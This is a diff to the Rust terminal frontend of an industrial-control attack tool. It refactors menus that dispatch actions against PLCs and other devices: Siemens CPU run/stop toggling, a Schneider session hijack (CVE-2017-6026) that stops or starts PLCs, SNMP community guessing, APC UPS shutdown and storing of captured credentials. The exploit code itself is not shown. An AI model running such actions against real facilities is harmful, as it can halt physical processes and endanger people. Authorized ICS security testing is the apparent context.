@@ -1,12 +1,14 @@
-//! TUI frontend for scadaver.
+﻿//! TUI frontend for scadaver.
 //!
 //! MQTT topic browser, live message display, and topic table layout were informed by
 //! `mqttui` by `EdJoPaTo`: <https://github.com/EdJoPaTo/mqttui>
 #![allow(clippy::too_many_lines)]
-use casket::core::autodetect::{probe_all, DeviceInfo};
-use casket::core::network::{get_interfaces, local_ip_for, NetworkInterface};
 use crate::db::{Database, DeviceRecord};
 use anyhow::Result;
+use casket::core::autodetect::{probe_all, DeviceInfo};
+use casket::core::network::{get_interfaces, local_ip_for, NetworkInterface};
+use casket::vendors::mqtt::attacks::{acl_variants, classify_payload, is_sensitive};
+use casket::vendors::mqtt::session::{ConnectOptions, MqttSession, MqttVersion};
 use crossterm::event::{self, Event, KeyCode, KeyEventKind, KeyModifiers};
 use ratatui::{
     backend::Backend,
@@ -22,8 +24,6 @@ use std::fmt::Write as _;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{mpsc, Arc, Mutex};
 use std::time::Duration;
-use casket::vendors::mqtt::attacks::{acl_variants, classify_payload, is_sensitive};
-use casket::vendors::mqtt::session::{ConnectOptions, MqttSession, MqttVersion};
 
 // ─── Background events ───────────────────────────────────────────────────────
 
@@ -33,8 +33,17 @@ enum ScanEvent {
     Output(String),
     MqttLine(String),
     MqttDone(String),
-    CredFound { ip: String, username: String, password: String },
-    TagLeaves { ip: String, port: u16, vendor: String, leaves: Vec<(String, bool)> },
+    CredFound {
+        ip: String,
+        username: String,
+        password: String,
+    },
+    TagLeaves {
+        ip: String,
+        port: u16,
+        vendor: String,
+        leaves: Vec<(String, bool)>,
+    },
 }
 
 #[derive(Clone, Copy, PartialEq, Eq, Default)]
@@ -158,11 +167,19 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
                 .risk(ExploitRisk::WriteControl),
         ],
         "siemens" => vec![
-            ExploitDef::with_input("Read CPU State", "password (empty = stored / no auth)").capability(CapabilityKey::S7Tcp),
-            ExploitDef::with_input("Read I/O (inputs/outputs/merkers)", "password (empty = stored / no auth)").capability(CapabilityKey::S7Tcp),
-            ExploitDef::with_input("Toggle CPU State (run\u{2194}stop)", "password (empty = stored / no auth)")
-                .capability(CapabilityKey::S7Tcp)
-                .risk(ExploitRisk::WriteControl),
+            ExploitDef::with_input("Read CPU State", "password (empty = stored / no auth)")
+                .capability(CapabilityKey::S7Tcp),
+            ExploitDef::with_input(
+                "Read I/O (inputs/outputs/merkers)",
+                "password (empty = stored / no auth)",
+            )
+            .capability(CapabilityKey::S7Tcp),
+            ExploitDef::with_input(
+                "Toggle CPU State (run\u{2194}stop)",
+                "password (empty = stored / no auth)",
+            )
+            .capability(CapabilityKey::S7Tcp)
+            .risk(ExploitRisk::WriteControl),
             ExploitDef::with_input("Set Outputs", "01010101")
                 .capability(CapabilityKey::S7Tcp)
                 .risk(ExploitRisk::WriteControl),
@@ -190,8 +207,7 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
                 .risk(ExploitRisk::LongRunning),
             ExploitDef::with_input("Read Holding Registers", "0:100")
                 .capability(CapabilityKey::SchneiderModbus),
-            ExploitDef::with_input("Read Coils", "0:64")
-                .capability(CapabilityKey::SchneiderModbus),
+            ExploitDef::with_input("Read Coils", "0:64").capability(CapabilityKey::SchneiderModbus),
             ExploitDef::with_input("Read Input Registers", "0:100")
                 .capability(CapabilityKey::SchneiderModbus),
             ExploitDef::with_input("Read Discrete Inputs", "0:64")
@@ -210,15 +226,24 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
             ExploitDef::new("Flash LED")
                 .capability(CapabilityKey::SchneiderIdentity)
                 .risk(ExploitRisk::WriteControl),
-            ExploitDef::with_input("Session Hijack: get info [CVE-2017-6026]", "username (default: Administrator)")
-                .capability(CapabilityKey::SchneiderWeb)
-                .risk(ExploitRisk::SensitiveRead),
-            ExploitDef::with_input("Session Hijack: stop PLC [CVE-2017-6026]", "username (default: Administrator)")
-                .capability(CapabilityKey::SchneiderWeb)
-                .risk(ExploitRisk::WriteControl),
-            ExploitDef::with_input("Session Hijack: run PLC [CVE-2017-6026]", "username (default: Administrator)")
-                .capability(CapabilityKey::SchneiderWeb)
-                .risk(ExploitRisk::WriteControl),
+            ExploitDef::with_input(
+                "Session Hijack: get info [CVE-2017-6026]",
+                "username (default: Administrator)",
+            )
+            .capability(CapabilityKey::SchneiderWeb)
+            .risk(ExploitRisk::SensitiveRead),
+            ExploitDef::with_input(
+                "Session Hijack: stop PLC [CVE-2017-6026]",
+                "username (default: Administrator)",
+            )
+            .capability(CapabilityKey::SchneiderWeb)
+            .risk(ExploitRisk::WriteControl),
+            ExploitDef::with_input(
+                "Session Hijack: run PLC [CVE-2017-6026]",
+                "username (default: Administrator)",
+            )
+            .capability(CapabilityKey::SchneiderWeb)
+            .risk(ExploitRisk::WriteControl),
             ExploitDef::new("Map Modbus: Quick").capability(CapabilityKey::SchneiderModbus),
             ExploitDef::new("Map Modbus: Common").capability(CapabilityKey::SchneiderModbus),
             ExploitDef::with_input("Map Modbus: Custom", "hr:0:500,ir:0:100,co:0:128,di:0:128")
@@ -349,21 +374,52 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
                 .risk(ExploitRisk::WriteControl),
         ],
         "snmp" => vec![
-            ExploitDef::with_input("System Info (sysDescr / OID / uptime)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::with_input("Interface Table (MAC / speed / errors)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::with_input("Network Topology (IP addrs / routes / ARP)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::new("Community Scan (try common strings)").capability(CapabilityKey::SnmpUdp).risk(ExploitRisk::SensitiveRead),
-            ExploitDef::with_input("CVE Probe (match sysDescr → advisories)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpUdp),
-            ExploitDef::with_input("Walk OID Subtree", "OID [community]  e.g. 1.3.6.1.2.1 public")
+            ExploitDef::with_input(
+                "System Info (sysDescr / OID / uptime)",
+                "read community (empty = auto-discover)",
+            )
+            .capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input(
+                "Interface Table (MAC / speed / errors)",
+                "read community (empty = auto-discover)",
+            )
+            .capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input(
+                "Network Topology (IP addrs / routes / ARP)",
+                "read community (empty = auto-discover)",
+            )
+            .capability(CapabilityKey::SnmpUdp),
+            ExploitDef::new("Community Scan (try common strings)")
                 .capability(CapabilityKey::SnmpUdp)
-                .risk(ExploitRisk::LongRunning),
-            ExploitDef::with_input("Test Write Access (SET sysName → same value)", "write community (default: private)")
-                .capability(CapabilityKey::SnmpWrite)
                 .risk(ExploitRisk::SensitiveRead),
-            ExploitDef::with_input("APC UPS: Status (battery / load / runtime)", "read community (empty = auto-discover)").capability(CapabilityKey::SnmpApc),
-            ExploitDef::with_input("APC UPS: Graceful Shutdown [DESTRUCTIVE]", "write community (default: private)")
-                .capability(CapabilityKey::SnmpApc)
-                .risk(ExploitRisk::WriteControl),
+            ExploitDef::with_input(
+                "CVE Probe (match sysDescr → advisories)",
+                "read community (empty = auto-discover)",
+            )
+            .capability(CapabilityKey::SnmpUdp),
+            ExploitDef::with_input(
+                "Walk OID Subtree",
+                "OID [community]  e.g. 1.3.6.1.2.1 public",
+            )
+            .capability(CapabilityKey::SnmpUdp)
+            .risk(ExploitRisk::LongRunning),
+            ExploitDef::with_input(
+                "Test Write Access (SET sysName → same value)",
+                "write community (default: private)",
+            )
+            .capability(CapabilityKey::SnmpWrite)
+            .risk(ExploitRisk::SensitiveRead),
+            ExploitDef::with_input(
+                "APC UPS: Status (battery / load / runtime)",
+                "read community (empty = auto-discover)",
+            )
+            .capability(CapabilityKey::SnmpApc),
+            ExploitDef::with_input(
+                "APC UPS: Graceful Shutdown [DESTRUCTIVE]",
+                "write community (default: private)",
+            )
+            .capability(CapabilityKey::SnmpApc)
+            .risk(ExploitRisk::WriteControl),
         ],
         "bacnet" => vec![
             ExploitDef::new("Device Info").capability(CapabilityKey::BacnetIp),
@@ -626,7 +682,10 @@ struct MqttConnSettings {
 
 impl Default for MqttConnSettings {
     fn default() -> Self {
-        Self { tls: false, version: MqttVersion::V311 }
+        Self {
+            tls: false,
+            version: MqttVersion::V311,
+        }
     }
 }
 
@@ -646,7 +705,7 @@ struct DeviceOutput {
 }
 
 #[allow(clippy::struct_excessive_bools)]
-struct App {
+pub struct App {
     devices: Vec<DeviceRecord>,
     list_state: ListState,
     mode: Mode,
@@ -706,7 +765,7 @@ struct App {
 }
 
 impl App {
-    fn new(db: &Database) -> Self {
+    pub fn new(db: &Database) -> Self {
         let (tx, rx) = mpsc::channel();
         let devices = db.load_devices().unwrap_or_default();
         let n = devices.len();
@@ -915,7 +974,7 @@ impl App {
             match ev {
                 ScanEvent::DeviceFound(info) => {
                     let fields = serde_json::to_value(&info.fields).unwrap_or_default();
-                    let _ = db.upsert_device(&info.ip, &info.vendor, &fields);
+                    let _ = db.upsert_protocol_device(&info.ip, &info.vendor, &fields);
                     let _ = db.log(&info.ip, &format!("discovered vendor={}", info.vendor));
                     self.log(format!("[+] {} \u{2192} {}", info.ip, info.vendor));
                     self.reload(db);
@@ -938,18 +997,33 @@ impl App {
                     self.mqtt_attack_label = label;
                     self.mqtt_attack_running = false;
                 }
-                ScanEvent::CredFound { ip, username, password } => {
+                ScanEvent::CredFound {
+                    ip,
+                    username,
+                    password,
+                } => {
                     let fields = serde_json::json!({
                         "discovered_username": username,
                         "discovered_password": password,
                     });
-                    let _ = db.upsert_device(&ip, "discovered_creds", &fields);
+                    let vendor = db
+                        .load_devices()
+                        .ok()
+                        .and_then(|devs| devs.into_iter().find(|d| d.ip == ip))
+                        .map_or_else(|| "discovered".to_string(), |d| d.vendor);
+                    let _ = db.upsert_device(&ip, &vendor, &fields);
                     if self.output_lines.len() >= 500 {
                         self.output_lines.remove(0);
                     }
-                    self.output_lines.push(format!("[+] Credentials saved for {ip}: {username}"));
+                    self.output_lines
+                        .push(format!("[+] Credentials saved for {ip}: {username}"));
                 }
-                ScanEvent::TagLeaves { ip, port, vendor, leaves } => {
+                ScanEvent::TagLeaves {
+                    ip,
+                    port,
+                    vendor,
+                    leaves,
+                } => {
                     self.output_from_cache = false;
                     self.output_has_tag_content = true;
                     self.output_line_backup = None;
@@ -959,35 +1033,42 @@ impl App {
                     self.tag_write_vendor.clone_from(&vendor);
                     self.tag_leaves = leaves;
                     // Persist struct member leaves (dotted paths) for offline Overview expansion.
-                    let members: Vec<(&str, bool)> = self.tag_leaves
+                    let members: Vec<(&str, bool)> = self
+                        .tag_leaves
                         .iter()
                         .filter(|(p, _)| p.contains('.'))
                         .map(|(p, w)| (p.as_str(), *w))
                         .collect();
                     if !members.is_empty() {
-                        let _ = db.upsert_members(&ip, &members);
+                        let _ = db.upsert_members_for_protocol(&ip, &vendor, &members);
                     }
                     self.tag_leaf_line_indices =
                         build_leaf_line_indices(&self.output_lines, &self.tag_leaves);
-                    self.output_leaf_cursor =
-                        if self.tag_leaf_line_indices.is_empty() { None } else { Some(0) };
+                    self.output_leaf_cursor = if self.tag_leaf_line_indices.is_empty() {
+                        None
+                    } else {
+                        Some(0)
+                    };
                     if let Some(&(first_line, _)) = self.tag_leaf_line_indices.first() {
                         self.scroll_to_output_line(first_line);
                     }
                     // Persist output so it survives device-list navigation.
                     self.current_output_ip.clone_from(&ip);
-                    self.per_device_output.insert(ip, DeviceOutput {
-                        output_lines: self.output_lines.clone(),
-                        output_scroll: self.output_scroll,
-                        tag_leaves: self.tag_leaves.clone(),
-                        tag_leaf_line_indices: self.tag_leaf_line_indices.clone(),
-                        output_leaf_cursor: self.output_leaf_cursor,
-                        output_line_backup: None,
-                        tag_write_ip: self.tag_write_ip.clone(),
-                        tag_write_port: self.tag_write_port,
-                        tag_write_vendor: self.tag_write_vendor.clone(),
-                        scan_timestamp: self.scan_timestamp,
-                    });
+                    self.per_device_output.insert(
+                        ip,
+                        DeviceOutput {
+                            output_lines: self.output_lines.clone(),
+                            output_scroll: self.output_scroll,
+                            tag_leaves: self.tag_leaves.clone(),
+                            tag_leaf_line_indices: self.tag_leaf_line_indices.clone(),
+                            output_leaf_cursor: self.output_leaf_cursor,
+                            output_line_backup: None,
+                            tag_write_ip: self.tag_write_ip.clone(),
+                            tag_write_port: self.tag_write_port,
+                            tag_write_vendor: self.tag_write_vendor.clone(),
+                            scan_timestamp: self.scan_timestamp,
+                        },
+                    );
                 }
             }
         }
@@ -1006,18 +1087,21 @@ impl App {
         // Save current output to the old device's slot.
         let old_ip = std::mem::take(&mut self.current_output_ip);
         if !old_ip.is_empty() {
-            self.per_device_output.insert(old_ip, DeviceOutput {
-                output_lines: std::mem::take(&mut self.output_lines),
-                output_scroll: std::mem::replace(&mut self.output_scroll, 0),
-                tag_leaves: std::mem::take(&mut self.tag_leaves),
-                tag_leaf_line_indices: std::mem::take(&mut self.tag_leaf_line_indices),
-                output_leaf_cursor: self.output_leaf_cursor.take(),
-                output_line_backup: self.output_line_backup.take(),
-                tag_write_ip: std::mem::take(&mut self.tag_write_ip),
-                tag_write_port: std::mem::replace(&mut self.tag_write_port, 0),
-                tag_write_vendor: std::mem::take(&mut self.tag_write_vendor),
-                scan_timestamp: std::mem::take(&mut self.scan_timestamp),
-            });
+            self.per_device_output.insert(
+                old_ip,
+                DeviceOutput {
+                    output_lines: std::mem::take(&mut self.output_lines),
+                    output_scroll: std::mem::replace(&mut self.output_scroll, 0),
+                    tag_leaves: std::mem::take(&mut self.tag_leaves),
+                    tag_leaf_line_indices: std::mem::take(&mut self.tag_leaf_line_indices),
+                    output_leaf_cursor: self.output_leaf_cursor.take(),
+                    output_line_backup: self.output_line_backup.take(),
+                    tag_write_ip: std::mem::take(&mut self.tag_write_ip),
+                    tag_write_port: std::mem::replace(&mut self.tag_write_port, 0),
+                    tag_write_vendor: std::mem::take(&mut self.tag_write_vendor),
+                    scan_timestamp: std::mem::take(&mut self.scan_timestamp),
+                },
+            );
         }
         self.current_output_ip.clone_from(&selected_ip);
         // Restore the new device's output if we have a snapshot.
@@ -1052,7 +1136,11 @@ impl App {
             self.mqtt_total_msgs += 1;
             let (fmt, display) = classify_payload(&msg.topic, &msg.payload);
             let label = format!("{display}  [{fmt}]");
-            if let Some(entry) = self.mqtt_topics.iter_mut().find(|(t, _, _)| t == &msg.topic) {
+            if let Some(entry) = self
+                .mqtt_topics
+                .iter_mut()
+                .find(|(t, _, _)| t == &msg.topic)
+            {
                 entry.1 += 1;
                 entry.2 = label;
             } else {
@@ -1082,8 +1170,16 @@ impl App {
             client_id: "scadaver-tui".into(),
             keepalive: 60,
             clean_session: true,
-            username: if self.mqtt_username.is_empty() { None } else { Some(self.mqtt_username.clone()) },
-            password: if self.mqtt_password.is_empty() { None } else { Some(self.mqtt_password.clone()) },
+            username: if self.mqtt_username.is_empty() {
+                None
+            } else {
+                Some(self.mqtt_username.clone())
+            },
+            password: if self.mqtt_password.is_empty() {
+                None
+            } else {
+                Some(self.mqtt_password.clone())
+            },
             will: None,
             tls: self.mqtt_conn.tls || port == 8883,
             tls_verify: false,
@@ -1099,7 +1195,8 @@ impl App {
                 self.log(format!("[*] MQTT monitor \u{2192} {ip}:{port}"));
             }
             Err(e) => {
-                self.output_lines.push(format!("MQTT connect failed: {e:#}"));
+                self.output_lines
+                    .push(format!("MQTT connect failed: {e:#}"));
                 self.log(format!("[!] MQTT connect failed: {e:#}"));
             }
         }
@@ -1166,6 +1263,11 @@ impl App {
                 self.scroll_to_output_line(li);
             }
         }
+    }
+
+    #[cfg(test)]
+    pub fn draw(&mut self, frame: &mut ratatui::Frame) {
+        draw(frame, self);
     }
 }
 
@@ -1302,34 +1404,21 @@ fn capability_availability(dev: &DeviceRecord, capability: CapabilityKey) -> Act
                 has_port(&["iec104_port"]) || (vendor == "iec104" && has_port(&["port"]))
             })
         }
-        CapabilityKey::SnmpUdp => {
-            field_bool_value(fields, "cap_snmp_udp")
-                .unwrap_or_else(|| has_port(&["snmp_port"]) || vendor == "snmp")
-        }
+        CapabilityKey::SnmpUdp => field_bool_value(fields, "cap_snmp_udp")
+            .unwrap_or_else(|| has_port(&["snmp_port"]) || vendor == "snmp"),
         CapabilityKey::SnmpWrite => {
             // Enabled if we know a write community exists, or the user can supply one
-            field_bool_value(fields, "cap_snmp_udp")
-                .unwrap_or_else(|| vendor == "snmp")
+            field_bool_value(fields, "cap_snmp_udp").unwrap_or_else(|| vendor == "snmp")
         }
-        CapabilityKey::SnmpApc => {
-            field_bool_value(fields, "cap_snmp_apc").unwrap_or(false)
-        }
-        CapabilityKey::MqttTcp => {
-            field_bool_value(fields, "cap_mqtt_tcp")
-                .unwrap_or_else(|| has_port(&["mqtt_port"]) || vendor == "mqtt")
-        }
-        CapabilityKey::BacnetIp => {
-            field_bool_value(fields, "cap_bacnet")
-                .unwrap_or_else(|| has_port(&["bacnet_port"]) || vendor == "bacnet")
-        }
-        CapabilityKey::Dnp3Tcp => {
-            field_bool_value(fields, "cap_dnp3")
-                .unwrap_or_else(|| has_port(&["dnp3_port"]) || vendor == "dnp3")
-        }
-        CapabilityKey::OpcuaTcp => {
-            field_bool_value(fields, "cap_opcua")
-                .unwrap_or_else(|| has_port(&["opcua_port"]) || vendor == "opcua")
-        }
+        CapabilityKey::SnmpApc => field_bool_value(fields, "cap_snmp_apc").unwrap_or(false),
+        CapabilityKey::MqttTcp => field_bool_value(fields, "cap_mqtt_tcp")
+            .unwrap_or_else(|| has_port(&["mqtt_port"]) || vendor == "mqtt"),
+        CapabilityKey::BacnetIp => field_bool_value(fields, "cap_bacnet")
+            .unwrap_or_else(|| has_port(&["bacnet_port"]) || vendor == "bacnet"),
+        CapabilityKey::Dnp3Tcp => field_bool_value(fields, "cap_dnp3")
+            .unwrap_or_else(|| has_port(&["dnp3_port"]) || vendor == "dnp3"),
+        CapabilityKey::OpcuaTcp => field_bool_value(fields, "cap_opcua")
+            .unwrap_or_else(|| has_port(&["opcua_port"]) || vendor == "opcua"),
     };
 
     ActionAvailability {
@@ -1504,7 +1593,9 @@ fn schneider_transport(transport: TargetTransport) -> casket::vendors::schneider
     }
 }
 
-fn mitsubishi_transport(transport: TargetTransport) -> casket::vendors::mitsubishi::scan::Transport {
+fn mitsubishi_transport(
+    transport: TargetTransport,
+) -> casket::vendors::mitsubishi::scan::Transport {
     use casket::vendors::mitsubishi::scan::Transport;
     match transport {
         TargetTransport::Udp => Transport::Udp,
@@ -1828,9 +1919,10 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
                 port,
                 schneider_transport(transport),
             ) {
-                if let Some(dev) = devs.into_iter().find(|d| {
-                    d.identity_match || d.name.is_some() || d.firmware.is_some()
-                }) {
+                if let Some(dev) = devs
+                    .into_iter()
+                    .find(|d| d.identity_match || d.name.is_some() || d.firmware.is_some())
+                {
                     let name = dev
                         .name
                         .clone()
@@ -1876,9 +1968,13 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
                             )));
                             let mut fields = HashMap::new();
                             fields.insert("port".into(), Value::Number(i64::from(mb_port).into()));
-                            fields.insert("modbus_port".into(), Value::Number(i64::from(mb_port).into()));
+                            fields.insert(
+                                "modbus_port".into(),
+                                Value::Number(i64::from(mb_port).into()),
+                            );
                             fields.insert("protocol".into(), Value::String("modbus_tcp".into()));
-                            fields.insert("discovery_transport".into(), Value::String("tcp".into()));
+                            fields
+                                .insert("discovery_transport".into(), Value::String("tcp".into()));
                             fields.insert("cap_modbus_tcp".into(), Value::Bool(true));
                             let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
                                 vendor: "modbus".into(),
@@ -1907,7 +2003,9 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
                         target.ip
                     )));
                 }
-                let _ = tx.send(ScanEvent::Done(format!("Scan of {label} complete (no result)")));
+                let _ = tx.send(ScanEvent::Done(format!(
+                    "Scan of {label} complete (no result)"
+                )));
             }
             1 => {
                 let info = all.into_iter().next().unwrap();
@@ -1928,12 +2026,7 @@ fn spawn_ip_scan(target: TargetScan, tx: mpsc::Sender<ScanEvent>) {
                 let mut fields: HashMap<String, Value> = HashMap::new();
                 fields.insert(
                     "protocols".into(),
-                    Value::Array(
-                        protocols
-                            .iter()
-                            .map(|p| Value::String(p.clone()))
-                            .collect(),
-                    ),
+                    Value::Array(protocols.iter().map(|p| Value::String(p.clone())).collect()),
                 );
                 for d in all {
                     let vf = serde_json::to_value(&d.fields).unwrap_or_default();
@@ -2119,13 +2212,22 @@ fn scan_broadcast_ewon(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
     }
 }
 
+/// Returns `(network_address, host_bit_count)` for the given IP and netmask.
+fn compute_sweep_prefix(ip: std::net::Ipv4Addr, mask: std::net::Ipv4Addr) -> (std::net::Ipv4Addr, u32) {
+    let net = u32::from(ip) & u32::from(mask);
+    let host_bits = (!u32::from(mask)).count_ones();
+    (std::net::Ipv4Addr::from(net), host_bits)
+}
+
 fn scan_broadcast_modbus(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>) {
     use casket::core::modbus;
-    use std::net::{IpAddr, SocketAddr, TcpStream};
+    use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
     use std::time::Duration;
 
     let Ok(local_ip) = iface.ip.parse::<IpAddr>() else {
-        let _ = tx.send(ScanEvent::Output("[-] Cannot parse local interface IP".into()));
+        let _ = tx.send(ScanEvent::Output(
+            "[-] Cannot parse local interface IP".into(),
+        ));
         return;
     };
     let IpAddr::V4(v4) = local_ip else {
@@ -2134,13 +2236,54 @@ fn scan_broadcast_modbus(iface: &NetworkInterface, tx: &mpsc::Sender<ScanEvent>)
         ));
         return;
     };
-    let octets = v4.octets();
-    let prefix = format!("{}.{}.{}.", octets[0], octets[1], octets[2]);
-    let _ = tx.send(ScanEvent::Output(format!(
-        "[*] Modbus TCP sweep: {prefix}1-254 port 502 (batches of 32)..."
-    )));
 
-    let hosts: Vec<String> = (1u8..=254).map(|i| format!("{prefix}{i}")).collect();
+    let mask: Ipv4Addr = iface
+        .netmask
+        .parse()
+        .unwrap_or(Ipv4Addr::new(255, 255, 255, 0));
+    let (net, host_bits) = compute_sweep_prefix(v4, mask);
+
+    let (prefix, host_range): (String, Vec<u32>) = if host_bits > 8 {
+        // Subnet wider than /24 — sweeping the full range could mean 65k+ hosts.
+        // Fall back to the /24 that contains the local address.
+        let _ = tx.send(ScanEvent::Output(
+            "[!] Subnet is wider than /24; sweeping only the /24 containing the local address".into(),
+        ));
+        let octets = v4.octets();
+        let p = format!("{}.{}.{}.", octets[0], octets[1], octets[2]);
+        (p, (1u32..=254).collect())
+    } else {
+        let net_u32 = u32::from(net);
+        let host_count = (1u32 << host_bits).saturating_sub(2);
+        let p = format!("{net}");
+        // We'll build full addresses below, so the "prefix" is the network base u32.
+        let _ = p; // use net_u32 directly
+        let base = net_u32;
+        let addrs: Vec<u32> = (1..=host_count).map(|i| base + i).collect();
+        (String::new(), addrs)
+    };
+
+    let hosts: Vec<String> = if prefix.is_empty() {
+        // Normal netmask path: host_range contains full u32 addresses.
+        host_range
+            .into_iter()
+            .map(|addr| Ipv4Addr::from(addr).to_string())
+            .collect()
+    } else {
+        // Wide-subnet fallback: host_range contains last-octet values 1..=254.
+        host_range
+            .into_iter()
+            .map(|i| format!("{prefix}{i}"))
+            .collect()
+    };
+
+    let display_range = hosts
+        .first()
+        .and_then(|f| hosts.last().map(|l| format!("{f} – {l}")))
+        .unwrap_or_default();
+    let _ = tx.send(ScanEvent::Output(format!(
+        "[*] Modbus TCP sweep: {display_range} port 502 (batches of 32)..."
+    )));
     for batch in hosts.chunks(32) {
         let handles: Vec<_> = batch
             .iter()
@@ -2234,10 +2377,6 @@ fn fmt_tag_row(
     )
 }
 
-fn fmt_leaf_row(member_name: &str, value: &str, pad: usize) -> String {
-    format!("           {member_name:<pad$}  {value}")
-}
-
 fn run_exploit_for(
     vendor: &str,
     idx: usize,
@@ -2253,13 +2392,19 @@ fn run_exploit_for(
     let label = label.to_string();
 
     std::thread::spawn(move || {
-        struct DoneGuard { tx: mpsc::Sender<ScanEvent>, msg: String }
+        struct DoneGuard {
+            tx: mpsc::Sender<ScanEvent>,
+            msg: String,
+        }
         impl Drop for DoneGuard {
             fn drop(&mut self) {
                 let _ = self.tx.send(ScanEvent::Done(std::mem::take(&mut self.msg)));
             }
         }
-        let _guard = DoneGuard { tx: tx.clone(), msg: format!("{label} @ {ip}") };
+        let _guard = DoneGuard {
+            tx: tx.clone(),
+            msg: format!("{label} @ {ip}"),
+        };
 
         let ip2 = ip.clone();
         let tx2 = tx.clone();
@@ -2275,61 +2420,65 @@ fn run_exploit_for(
             }
             let _ = tx2.send(ScanEvent::Output(msg.to_string()));
         };
-        dispatch_exploit(&vendor, idx, &ip, port, &input, out, &tx);
+
+        // For Siemens actions, look up any previously stored device password.
+        let stored_pw: Option<String> = if vendor == "siemens" {
+            use crate::db::Database;
+            Database::open(&Database::default_path())
+                .ok()
+                .and_then(|db| db.load_devices().ok())
+                .and_then(|devs| devs.into_iter().find(|d| d.ip == ip))
+                .and_then(|dev| dev.fields["password"].as_str().map(str::to_string))
+        } else {
+            None
+        };
+
+        dispatch_exploit(&vendor, idx, &ip, port, &input, stored_pw.as_deref(), out, &tx);
     });
 }
 
-#[allow(clippy::cognitive_complexity)]
+#[allow(clippy::cognitive_complexity, clippy::too_many_arguments)]
 fn dispatch_exploit(
     vendor: &str,
     idx: usize,
     ip: &str,
     port: u16,
     input: &str,
+    stored_password: Option<&str>,
     out: impl Fn(&str),
     tx: &mpsc::Sender<ScanEvent>,
 ) {
+    // Actions that return structured tag data must be handled inline here so
+    // they can forward ScanEvent::TagLeaves to the TUI channel.
     match (vendor, idx) {
-        ("beckhoff", 0) => exploit_beckhoff_info(ip, port, &out),
-        ("beckhoff", 1) => exploit_beckhoff_state(ip, port, "run", &out),
-        ("beckhoff", 2) => exploit_beckhoff_state(ip, port, "config", &out),
-        ("beckhoff", 3) => exploit_beckhoff_reboot(ip, port, &out),
-        ("beckhoff", 4) => exploit_beckhoff_adduser(ip, port, input, &out),
-        ("siemens", 0) => exploit_siemens_cpu(ip, port, input, &out),
-        ("siemens", 1) => exploit_siemens_io(ip, port, input, &out),
-        ("siemens", 2) => exploit_siemens_toggle(ip, port, input, &out),
-        ("schneider" | "modicon", 0) => exploit_schneider_flash(ip, &out),
-        ("schneider" | "modicon", 1) => exploit_schneider_hijack_info(ip, port, input, &out),
-        ("schneider" | "modicon", 2) => exploit_schneider_action(ip, port, "stop", input, &out),
-        ("schneider" | "modicon", 3) => exploit_schneider_action(ip, port, "run", input, &out),
-        ("phoenix", 0) => exploit_phoenix_passwords(ip, port, &out),
+        ("beckhoff", 7) => {
+            exploit_beckhoff_symbols(ip, port, &out, tx);
+            return;
+        }
         ("phoenix", 1) => {
-            let tags = exploit_phoenix_list_tags(ip, port, &out);
+            let tags = crate::ops::exploit_phoenix_list_tags(ip, port, &out);
             if !tags.is_empty() {
-                let leaves = tags.into_iter().map(|n| (n, true)).collect();
                 let _ = tx.send(ScanEvent::TagLeaves {
                     ip: ip.to_string(),
                     port,
                     vendor: vendor.to_string(),
-                    leaves,
+                    leaves: tags.into_iter().map(|n| (n, true)).collect(),
                 });
             }
+            return;
         }
         ("phoenix", 2) => {
-            let tags = exploit_phoenix_read_tags(ip, port, &out);
+            let tags = crate::ops::exploit_phoenix_read_tags(ip, port, &out);
             if !tags.is_empty() {
-                let leaves = tags.into_iter().map(|n| (n, true)).collect();
                 let _ = tx.send(ScanEvent::TagLeaves {
                     ip: ip.to_string(),
                     port,
                     vendor: vendor.to_string(),
-                    leaves,
+                    leaves: tags.into_iter().map(|n| (n, true)).collect(),
                 });
             }
+            return;
         }
-        ("phoenix", 3) => exploit_phoenix_write_tag(ip, port, input, &out),
-        ("phoenix", 4) => exploit_phoenix_info(ip, port, &out),
-        ("ewon", 0) => exploit_ewon_creds(ip, port, input, &out),
         ("ewon", 1) => {
             out(&format!("Reading tags from eWON at {ip}…"));
             match casket::vendors::ewon::scan::read_tag_values(ip, port, None) {
@@ -2349,227 +2498,17 @@ fn dispatch_exploit(
                 }
                 Err(e) => out(&format!("Error: {e}")),
             }
+            return;
         }
-        ("rockwell" | "enip", 0) => exploit_rockwell_identity(ip, port, &out),
         ("rockwell" | "enip", 1) => {
-            let leaves = exploit_rockwell_tags(ip, port, &out);
+            let leaves = crate::ops::exploit_rockwell_tags(ip, port, &out);
             let _ = tx.send(ScanEvent::TagLeaves {
                 ip: ip.to_string(),
                 port,
                 vendor: vendor.to_string(),
                 leaves,
             });
-        }
-        ("rockwell" | "enip", 2) => exploit_rockwell_read(ip, port, input, &out),
-        ("rockwell" | "enip", 3) => exploit_rockwell_write(ip, port, input, &out),
-        ("mitsubishi", 0) => exploit_mitsubishi_info(ip, &out),
-        ("mitsubishi", 1) => exploit_slmp_map(ip, port, "quick", &out),
-        ("mitsubishi", 2) => exploit_slmp_map(ip, port, "common", &out),
-        ("beckhoff", 5) => exploit_beckhoff_get_state(ip, port, &out),
-        ("beckhoff", 6) => exploit_beckhoff_add_route(ip, input, &out),
-        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, port, &out, tx),
-        ("siemens", 3) => exploit_siemens_set_outputs(ip, port, input, &out),
-        ("siemens", 4) => exploit_siemens_set_merkers(ip, port, input, &out),
-        ("siemens", 5) => exploit_siemens_list_dbs(ip, port, input, &out),
